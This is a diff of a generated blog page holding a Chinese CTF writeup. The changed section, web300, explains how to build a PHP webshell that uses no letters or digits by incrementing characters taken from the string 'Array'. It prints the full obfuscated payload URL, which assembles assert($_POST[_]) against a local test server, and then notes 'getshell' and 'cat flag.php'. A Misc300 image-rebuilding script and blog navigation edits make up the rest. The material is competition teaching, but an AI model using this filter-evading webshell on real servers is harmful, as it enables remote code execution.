@@ -100,7 +100,7 @@
 <h3 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h3><p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/GjGcHa903a.png" alt="mark"></p>
 <p>阅读源码 构造不含上述字符的shell即可</p>
 <p>根据p牛博客<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
-<p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？<br>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br>再取这个字符串的第一个字母，就可以获得’A’了<br>payload:<br>    <a href="http://127.0.0.1:8000/web300.php?content=$_=[].&#39;&#39;;$_=$_[&#39;]&#39;==&#39;[&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_" target="_blank" rel="external">http://127.0.0.1:8000/web300.php?content=$_=[].&#39;&#39;;$_=$_[&#39;]&#39;==&#39;[&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_</a>]);</p>
+<p>‘a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>那么，如何拿到一个值为字符串’a’的变量呢？<br>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：<br>再取这个字符串的第一个字母，就可以获得’A’了<br>payload:<br><code>http://127.0.0.1:8000/web300.php?content=$_=[].&#39;&#39;;$_=$_[&#39;]&#39;==&#39;[&#39;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</code></p>
 <p>url 编码一下 提交<br>getshell<br>cat flag.php  </p>
 <p><img src="http://ouiii5myz.bkt.clouddn.com/mdimg/171203/cAH0IkgdfI.png" alt="mark"></p>
 <h3 id="Misc300"><a href="#Misc300" class="headerlink" title="Misc300"></a>Misc300</h3><p>脚本：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line">from PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">with <span class="built_in">open</span>(<span class="string">'pixels.jpg.pkl'</span>) as f:</div><div class="line">       data= pickle.loads(f.read().encode(<span class="string">'utf8'</span>))</div><div class="line"></div><div class="line">white_pixels = [(<span class="built_in">int</span>(e[<span class="number">0</span>]), <span class="built_in">int</span>(e[<span class="number">1</span>])) <span class="keyword">for</span> e in data[<span class="number">1</span>:]]</div><div class="line"><span class="built_in">width</span> = <span class="built_in">max</span>([p[<span class="number">0</span>] <span class="keyword">for</span> p in white_pixels]) + <span class="number">10</span></div><div class="line"><span class="built_in">height</span> = <span class="built_in">max</span>([p[<span class="number">1</span>] <span class="keyword">for</span> p in white_pixels])+ <span class="number">10</span></div><div class="line"></div><div class="line"><span class="built_in">image</span> = Image.<span class="keyword">new</span>(<span class="string">'1'</span>, (<span class="built_in">width</span>, <span class="built_in">height</span>), <span class="number">0</span>)</div><div class="line"><span class="built_in">pixels</span> = <span class="built_in">image</span>.load()</div><div class="line"></div><div class="line"><span class="keyword">for</span> pixel in white_pixels:</div><div class="line">       <span class="built_in">pixels</span>[pixel[<span class="number">0</span>],pixel[<span class="number">1</span>]] = <span class="number">255</span></div><div class="line"></div><div class="line"><span class="built_in">image</span>.show()</div></pre></td></tr></table></figure></p>
@@ -115,6 +115,15 @@
     
     
 <nav class="article-nav">
+  
+    <a href="/2017/12/03/ctf中的RSA总结/" id="article-nav-newer" class="article-nav-link-wrap prev">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ctf中的RSA总结
+        
+      </div>
+    </a>
   
   
     <a href="/2017/11/07/2017山东大学生网络安全技能大赛决赛writeup/" id="article-nav-older" class="article-nav-link-wrap next">
@@ -138,7 +147,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget-body">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -156,6 +165,10 @@
       <ul>
         
           <li>
+            <a href="/2017/12/03/ctf中的RSA总结/">ctf中的RSA总结</a>
+          </li>
+        
+          <li>
             <a href="/2017/12/03/2017湖湘杯writeup/">2017湖湘杯writeup</a>
           </li>
         
@@ -169,10 +182,6 @@
         
           <li>
             <a href="/2017/08/09/RSA共模攻击/">RSA共模攻击</a>
-          </li>
-        
-          <li>
-            <a href="/2017/08/08/hexo-github-blog搭建/">hexo+github blog搭建</a>
           </li>
         
       </ul>
